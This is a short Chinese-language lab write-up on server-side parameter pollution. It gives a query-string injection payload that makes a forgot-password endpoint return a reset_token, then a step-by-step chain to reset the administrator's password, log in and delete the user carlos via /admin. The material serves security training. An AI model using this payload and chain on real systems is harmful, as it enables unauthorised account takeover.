---
title: "Server-Side Parameter Pollution: 查询串注入取 reset_token 的方法"
---

# Server-Side Parameter Pollution: 查询串注入取 reset_token 的方法

## 适用条件

服务端把用户输入直接拼进对内部 API 的查询串（`?username=<input>&field=email`），且内部 API 的响应体回显所选字段的值。典型面：忘记密码表单的 `username`。

## 注入语法

在 `username` 值内投递第二参数，用 `#` 截断后端查询串的尾部固定参数：

```
username=administrator%26field=reset_token%23
```

- `%26` = `&`，另起一个后端参数
- `%23` = `#`，注释掉后端原有尾参（如 `&field=email`）
- 投递时必须用原始 body（`--body 'csrf=..&username=administrator%26field=reset_token%23'`）；表单编码器会把已编码的 `%` 再编码成 `%25`，注入失效

## 字段名探测

先发 `field=email` 确认回显结构（返回 `{"result":"<masked>@x","type":"email"}`），再用 `field=<猜测>` 观察错误串暴露的合法字段名；本案合法值为 `reset_token`，返回明文 token。

## 收尾链

1. `GET /forgot-password?reset_token=<token>` 取新密码表单（表单内嵌同一 token 与 csrf）
2. `POST` 同 URL：`csrf` + `reset_token` + `new-password-1/2` → 302
3. `POST /login`（新口令）→ 302 `/my-account`，会话 cookie 换新
4. `GET /admin` 取 `carlos` 删除链接 → `GET /admin/delete?username=carlos` → 302 `/admin`
5. `banner_verdict` 读首访横幅确认 is-solved

## 判据

字段值层面的污染证据是响应体 `type` 字段翻转（`email` → `reset_token`）；求解判据是横幅 `Congratulations, you solved the lab!`。
